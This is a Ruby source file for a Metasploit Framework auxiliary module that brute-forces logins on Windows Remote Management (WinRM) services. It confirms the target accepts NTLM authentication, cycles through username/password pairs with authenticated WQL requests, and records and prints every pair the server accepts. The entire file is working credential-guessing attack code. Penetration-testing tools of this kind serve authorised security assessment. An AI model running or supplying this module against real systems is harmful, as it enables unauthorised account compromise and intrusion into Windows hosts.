##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ntlm/message'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::WinRM
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'WinRM Login Utility',
			'Version'        => '$Revision$',
			'Description'    => %q{
				This module attempts to authenticate to a WinRM service. It currently
				works only if the remote end allows Negotiate(NTLM) authentication.
				Kerberos is not currently supported.
				},
			'References'  =>
				[

				],
			'Author'         => [ 'thelightcosine' ],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'        => MSF_LICENSE
		)

	end


	def run_host(ip)
		unless accepts_ntl_auth
			print_error "The Remote WinRM  server  (#{ip} does not appear to allow Negotiate(NTLM) auth"
			return
		end
		each_user_pass do |user, pass|
			resp,c = send_request_ntlm(test_request)
			if resp.code == 200
				cred_hash = {
					:host              => ip,
					:port              => rport,
					:sname          => 'winrm',
					:pass              => pass,
					:user              => user,
					:source_type => "user_supplied",
					:active            => true
				}
				report_auth_info(cred_hash)
				print_good "Valid credential found: #{user}:#{pass}"
			elsif resp.code == 401
				print_error "Login failed: #{user}:#{pass}"
			else
				print_error "Recieved unexpected Response Code: #{resp.code}"
			end
		end
	end

	def accepts_ntl_auth
		 parse_auth_methods(winrm_poke).include? "Negotiate"
	end

	def test_request
		data = winrm_wql_msg("Select Name,Status from Win32_Service")
	end

end
